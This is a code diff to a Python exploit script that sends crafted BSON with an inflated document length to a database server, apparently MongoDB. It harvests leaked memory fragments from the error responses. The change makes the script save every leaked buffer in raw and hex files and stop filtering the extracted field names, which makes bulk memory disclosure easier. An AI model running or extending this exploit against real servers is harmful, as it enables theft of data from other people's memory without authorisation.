@@ -14,6 +14,8 @@ import struct
 import zlib
 import re
 import argparse
+import binascii
+from datetime import datetime
 
 def send_probe(host, port, doc_len, buffer_size):
     """Send crafted BSON with inflated document length"""
@@ -50,32 +52,38 @@ def send_probe(host, port, doc_len, buffer_size):
     except:
         return b''
 
-def extract_leaks(response):
-    """Extract leaked data from error response"""
+def extract_leaks(response, raw_file="leaks.raw", hex_file="leaks.hex"):
+    """Extract leaked data and store all raw buffers in .raw and .hex files"""
     if len(response) < 25:
         return []
-    
+
     try:
         msg_len = struct.unpack('<I', response[:4])[0]
         if struct.unpack('<I', response[12:16])[0] == 2012:
             raw = zlib.decompress(response[25:msg_len])
         else:
             raw = response[16:msg_len]
-    except:
+    except Exception:
         return []
-    
+
+    # === Store RAW bytes ===
+    with open(raw_file, "ab") as f:
+        f.write(raw)
+
+    # === Store HEX representation ===
+    with open(hex_file, "ab") as f:
+        f.write(binascii.hexlify(raw) + b"\n")
+
     leaks = []
-    
+
     # Field names from BSON errors
     for match in re.finditer(rb"field name '([^']*)'", raw):
-        data = match.group(1)
-        if data and data not in [b'?', b'a', b'$db', b'ping']:
-            leaks.append(data)
-    
+        leaks.append(match.group(1))
+
     # Type bytes from unrecognized type errors
     for match in re.finditer(rb"type (\d+)", raw):
         leaks.append(bytes([int(match.group(1)) & 0xFF]))
-    
+
     return leaks
 
 def main():
